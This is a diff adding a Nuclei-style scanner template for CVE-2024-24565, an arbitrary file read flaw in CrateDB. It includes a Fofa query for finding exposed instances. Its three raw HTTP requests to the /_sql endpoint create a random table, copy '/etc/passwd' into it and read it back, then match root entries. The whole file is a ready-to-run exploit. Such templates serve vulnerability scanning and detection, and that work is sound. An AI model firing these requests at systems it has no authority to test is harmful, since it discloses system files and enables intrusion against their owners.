@@ -1,0 +1,72 @@
+id: CVE-2024-24565
+
+info:
+  name: CrateDB数据库任意文件读取漏洞
+  author: zan8in
+  severity: high
+  description: |
+    Fofa: title="CrateDB"
+  reference:
+    - https://mp.weixin.qq.com/s/43ciyt7QFR3k3kjdfxZ7kQ
+  tags: CrateDB
+flow: |
+  http("r0") && http("r1") && http("r2")
+
+variables:
+  tablename: "{{rand_base(8)}}"
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        POST /_sql?types HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+
+        {"stmt":"CREATE TABLE {{tablename}}(info_leak STRING)"}
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+        internal: true
+        condition: and
+
+  - id: "r1"
+    raw:
+      - |
+        POST /_sql?types HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+
+        {"stmt":"COPY {{tablename}} FROM '/etc/passwd' with (format='csv', header=false)"}
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+        internal: true
+        condition: and
+
+  - id: "r2"
+    raw:
+      - |
+        POST /_sql?types HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+
+        {"stmt":"SELECT * FROM {{tablename}} limit 10"}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
+        part: body
+
